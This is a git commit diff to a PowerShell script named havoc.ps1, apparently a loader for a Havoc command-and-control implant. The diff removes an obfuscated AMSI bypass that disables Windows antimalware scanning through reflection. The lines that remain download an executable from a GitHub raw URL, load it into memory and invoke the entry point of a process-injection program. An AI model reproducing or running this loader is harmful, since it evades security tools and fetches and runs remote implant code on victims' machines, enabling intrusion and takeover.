aabc4587dd209f2a80894154ebcf23a4b4e17347
Amarjit Labhuram <amarjit.labhuram@gmail.com>
2023-07-16 20:04:34 +0300

    Update havoc.ps1

--- havoc.ps1
+++ havoc.ps1
@@ -1,6 +1,3 @@
-# AMSI bypass
-[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
-
 $bytes = (Invoke-WebRequest -useb "https://github.com/chr0n1k/AL2021/blob/main/program1_donutf7_havoc.exe?raw=true").Content;
 $assembly = [System.Reflection.Assembly]::Load($bytes);
 $entryPointMethod = $assembly.GetType('QUserAPCProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
